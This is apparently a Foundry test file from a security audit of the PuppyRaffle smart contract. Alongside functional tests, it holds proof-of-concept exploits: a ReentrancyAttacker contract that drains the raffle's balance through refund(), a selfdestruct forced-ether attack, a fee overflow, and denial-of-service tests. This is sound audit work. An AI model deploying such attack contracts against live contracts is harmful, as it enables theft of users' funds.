// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    function testDosOnEnterRaffle() public {
        address playerZero = address(uint160(1000));
        deal(playerZero, 1 ether);
        address[] memory players = new address[](1);
        players[0] = playerZero;
        vm.prank(playerZero);
        puppyRaffle.enterRaffle{value: entranceFee * 1}(players);

        address alice = makeAddr("alice");
        deal(alice, 1 ether);

        address[] memory players2 = new address[](1);
        uint256 gasStartAlice = gasleft();
        players2[0] = alice;
        vm.prank(alice);
        puppyRaffle.enterRaffle{value: entranceFee * 1}(players2);
        uint256 gasLeftAlice = gasStartAlice - gasleft();

        // Adding 100 player to the bunch
        address[] memory playerx = new address[](100);
        for (uint256 idx; idx < playerx.length; idx++) {
            address play__er = address(uint160(idx));
            playerx[idx] = play__er;
        }
        uint256 gasStartCris = gasleft();
        address cris = makeAddr("cris");
        deal(cris, 100 ether);
        vm.prank(cris);
        puppyRaffle.enterRaffle{value: entranceFee * playerx.length}(playerx);
        uint256 gasLeftCris = gasStartCris - gasleft();

        // Gas consumed by next 100 players
        uint256 count = 0;
        address[] memory playerz = new address[](100);
        for (uint256 idx; idx < playerz.length; idx++) {
            address play__er = address(uint160(idx + playerz.length));
            playerz[count] = play__er;
            count += 1;
        }

        uint256 gasStartDock = gasleft();
        address Dock = makeAddr("Dock");
        deal(Dock, 100 ether);
        vm.prank(Dock);
        puppyRaffle.enterRaffle{value: entranceFee * playerx.length}(playerz);
        uint256 gasLeftDock = gasStartDock - gasleft();

        console.log("Gas consumed by alice: %s", gasLeftAlice);
        console.log("Gas consumed by 100 players: %s", gasLeftCris);
        console.log("Gas consumed by next 100 players: %s", gasLeftDock);

        assertLt(gasLeftAlice, gasLeftCris);
        assertLt(gasLeftCris, gasLeftDock);
    }

    function testReentrancyInRefundFunction() public playersEntered {
        address alice = makeAddr("alice");
        deal(alice, 1 ether);
        vm.prank(alice);
        ReentrancyAttacker attacker = new ReentrancyAttacker{value: 1 ether}(address(puppyRaffle));

        address[] memory arr = new address[](1);
        arr[0] = address(attacker);

        vm.prank(address(attacker));
        puppyRaffle.enterRaffle{value: entranceFee}(arr);

        console.log("puppyRaffle balance before attack: %s", address(puppyRaffle).balance);
        console.log("attackContract balance before attack: %s", address(attacker).balance);

        assertEq(address(puppyRaffle).balance, 5 ether);
        assertEq(address(attacker).balance, 0);

        vm.prank(alice);
        attacker.setIdx();

        vm.startPrank(address(attacker));
        uint256 idx = puppyRaffle.getActivePlayerIndex(address(attacker));
        puppyRaffle.refund(idx);
        vm.stopPrank();

        console.log("puppyRaffle balance after attack: %s", address(puppyRaffle).balance);
        console.log("attackContract balance after attack: %s", address(attacker).balance);
        assertEq(address(puppyRaffle).balance, 0);
        assertEq(address(attacker).balance, 5 ether);
    }

    function aliceEntered(address alice) public {
        deal(alice, 100 ether);
        address[] memory enterAttacker = new address[](1);
        enterAttacker[0] = alice;
        vm.prank(alice);
        puppyRaffle.enterRaffle{value: entranceFee}(enterAttacker);
    }
    /**
     * @dev Complete the function later
     */

    function testExploitRandomnessInSelectWinner() public playersEntered {
        address alice = makeAddr("alice");
        aliceEntered(alice);

        vm.prank(alice);
        vm.expectRevert();
        puppyRaffle.selectWinner();

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // vm.prank(alice);
        // puppyRaffle.selectWinner();
    }

    function testArithmeticOverlowInSelectWinner() public playersEntered {
        address alice = makeAddr("alice");
        aliceEntered(alice);

        address[] memory playerx = new address[](88);
        for (uint256 idx = 0; idx < 88; idx++) {
            address player = address(uint160(idx + 5));
            playerx[idx] = player;
        }

        vm.prank(alice);
        puppyRaffle.enterRaffle{value: entranceFee * playerx.length}(playerx);

        // 93 ether
        console.log("Contract balance before: %s", address(puppyRaffle).balance);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();

        console.log("Total fees: %s", puppyRaffle.totalFees());
        console.log("Actual Contract balance: %s", address(puppyRaffle).balance);

        /**
         * @notice Overflow!
         * totalFees is uint64 and type(uint64).max is 18.4 ether. Any value beyond that overflows
         * Desired totalFees 93 * 0.2 ~= 18.6 ether
         * Actual totalFees: 153255926290448384 ~ 0.15 ether
         *  Actual contract balance: 18.6 ether
         */
        assertLt(puppyRaffle.totalFees(), address(puppyRaffle).balance);

        vm.expectRevert();
        puppyRaffle.withdrawFees();
    }

    function testCheckWithdrawalInoperability() public playersEntered {
        address alice = makeAddr("alice");
        deal(alice, 1 ether);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // 0.8 ether -> totalFees
        puppyRaffle.selectWinner();

        // contract balance: 0.8 ether.
        // Total fees: 0.8 ether.
        console.log("Contract balance before attack: %s", address(puppyRaffle).balance);
        console.log("Contract totalFees before attack: %s", puppyRaffle.totalFees());

        vm.startPrank(alice);
        ReentrancyAttacker attacker = new ReentrancyAttacker{value: 1 ether}(address(puppyRaffle));
        // Send 1 ether to puppy raffle through selfdestruct
        attacker.destruct(address(puppyRaffle));
        vm.stopPrank();

        // Discrepancy
        // contract balance: 1.8 ether.
        // Total fees: 0.8 ether.
        console.log("Contract balance after attack: %s", address(puppyRaffle).balance);
        console.log("Contract totalFees after attack: %s", puppyRaffle.totalFees());

        assertLt(puppyRaffle.totalFees(), address(puppyRaffle).balance);

        vm.expectRevert();
        puppyRaffle.withdrawFees();
    }

    function testSelectWinnerDOS() public {
        address[] memory players = new address[](4);
        players[0] = (address(new ReentrancyAttacker(address(puppyRaffle))));
        players[1] = (address(new ReentrancyAttacker(address(puppyRaffle))));
        players[2] = (address(new ReentrancyAttacker(address(puppyRaffle))));
        players[3] = (address(new ReentrancyAttacker(address(puppyRaffle))));
        puppyRaffle.enterRaffle{value: 4 ether}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert();
        puppyRaffle.selectWinner();
    }
}

contract ReentrancyAttacker {
    PuppyRaffle public raffle;
    uint256 constant entranceFee = 1e18;
    uint256 public idx;

    address private owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "You are not the owner");
        _;
    }

    constructor(address _raffle) payable {
        raffle = PuppyRaffle(_raffle);
        owner = msg.sender;
    }

    function setIdx() external onlyOwner {
        idx = raffle.getActivePlayerIndex(address(this));
    }

    function destruct(address _address) external onlyOwner {
        selfdestruct(payable(_address));
    }

    receive() external payable {
        if (address(raffle).balance > 0) {
            raffle.refund(idx);
        }
    }
}
